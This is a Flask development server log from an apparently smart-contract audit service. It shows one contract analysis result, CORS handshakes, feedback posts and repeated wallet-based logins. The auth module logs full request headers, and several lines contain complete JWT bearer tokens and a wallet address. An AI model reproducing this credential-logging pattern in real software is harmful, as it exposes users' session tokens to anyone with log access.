2025-06-23 08:00:49,520 - app.services.contract_service - INFO - Final vulnerability determination: False
2025-06-23 08:00:49,521 - app.services.contract_service - INFO - Attack strategy summary: - No vulnerabilities related to reentrancy, permission, or unsafe calls are present because the contract does not handle ETH or external calls.  
- There is no access control on the `set` function, meaning anyone can overwrite the stored value at any time. While this is not necessarily a security vulnerability, it may be undesirable depending on the intended use case.  
- No arithmetic operations are performed, so no math errors or overflows are possible.  
- No backdoors or economic exploits exist as the contract does not manage funds or complex logic.

3.
2025-06-23 08:00:49,523 - app.services.contract_service - INFO - Analysis completed with status: OK
2025-06-23 08:00:49,524 - app.services.contract_service - INFO - Temporary file /tmp/tmpns30p0fx.sol removed
2025-06-23 08:00:49,565 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-23_08-00, status: OK
2025-06-23 08:00:49,567 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-23 08:00:49,569 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:00:49,570 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:00:49,572 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:00:49,573 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:00:49,575 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:00:49] "POST /analyze HTTP/1.1" 200 -
2025-06-23 08:00:49,589 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:00:49,591 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:00:49,592 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:00:49,594 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 08:00:49,596 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:00:49] "OPTIONS /history HTTP/1.1" 200 -
2025-06-23 08:00:49,644 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:00:49,647 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:00:49,649 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:00:49,650 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:00:49,652 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:00:49] "GET /history HTTP/1.1" 200 -
2025-06-23 08:01:04,144 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:01:04,150 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:01:04,155 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:01:04,160 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 08:01:04,166 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:01:04] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-23 08:01:04,183 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 08:01:04,231 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 4, statut: OK, poids de la requ√™te: 2.0
2025-06-23 08:01:04,233 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:01:04,234 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:01:04,235 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:01:04,236 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:01:04,238 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:01:04] "POST /feedback HTTP/1.1" 200 -
2025-06-23 08:01:08,009 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 08:01:08,013 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 08:01:08,016 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 08:01:08,019 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 08:01:08,023 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 08:01:08] "GET /history HTTP/1.1" 200 -
2025-06-23 10:14:56,785 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 10:14:56,955 - app.app - INFO - Application started
2025-06-23 10:14:56,966 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.192.5:8000
2025-06-23 10:14:56,967 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 10:15:28,211 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:15:28,218 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:15:28,232 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:15:28,237 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 10:15:28,246 - werkzeug - INFO - 192.168.192.1 - - [23/Jun/2025 10:15:28] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 10:15:28,262 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 10:15:28,265 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NzIzNDh9.ecAA9aBZs0IKVIICViOCYN4GHwEwjcia00pmO2ZOUvc', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 10:15:28,267 - app.api.auth - INFO - Request content type: application/json
2025-06-23 10:15:28,268 - app.api.auth - INFO - Processing JSON request
2025-06-23 10:15:28,271 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:15:28,724 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:15:28,729 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:15:28,732 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:15:28,733 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:15:28,735 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:15:28,738 - werkzeug - INFO - 192.168.192.1 - - [23/Jun/2025 10:15:28] "POST /login HTTP/1.1" 200 -
2025-06-23 10:25:41,630 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 10:25:41,810 - app.app - INFO - Application started
2025-06-23 10:25:41,822 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.18.0.5:8000
2025-06-23 10:25:41,823 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 10:25:43,365 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:25:43,368 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:25:43,371 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:25:43,374 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 10:25:43,378 - werkzeug - INFO - 172.18.0.1 - - [23/Jun/2025 10:25:43] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 10:25:43,388 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 10:25:43,390 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NzczMjh9.SyDXV_8h6rGZS7CkogUuO8PhnPKAabFuK5h7APAmmG0', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 10:25:43,391 - app.api.auth - INFO - Request content type: application/json
2025-06-23 10:25:43,392 - app.api.auth - INFO - Processing JSON request
2025-06-23 10:25:43,395 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:25:43,890 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:25:43,893 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:25:43,895 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:25:43,896 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:25:43,897 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:25:43,899 - werkzeug - INFO - 172.18.0.1 - - [23/Jun/2025 10:25:43] "POST /login HTTP/1.1" 200 -
2025-06-23 10:33:14,764 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 10:33:14,968 - app.app - INFO - Application started
2025-06-23 10:33:14,980 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.19.0.5:8000
2025-06-23 10:33:14,982 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 10:33:15,365 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 10:33:15,368 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2Nzc5NDN9.IekfH_pdhVf24ghkRmjt0poAZyCa4l4xQy4yJ9muCMk', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 10:33:15,369 - app.api.auth - INFO - Request content type: application/json
2025-06-23 10:33:15,371 - app.api.auth - INFO - Processing JSON request
2025-06-23 10:33:15,373 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:33:15,857 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:33:15,861 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:33:15,863 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:33:15,870 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:33:15,874 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:33:15,878 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 10:33:15] "POST /login HTTP/1.1" 200 -
2025-06-23 10:47:01,222 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 10:47:01,384 - app.app - INFO - Application started
2025-06-23 10:47:01,396 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.21.0.5:8000
2025-06-23 10:47:01,397 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
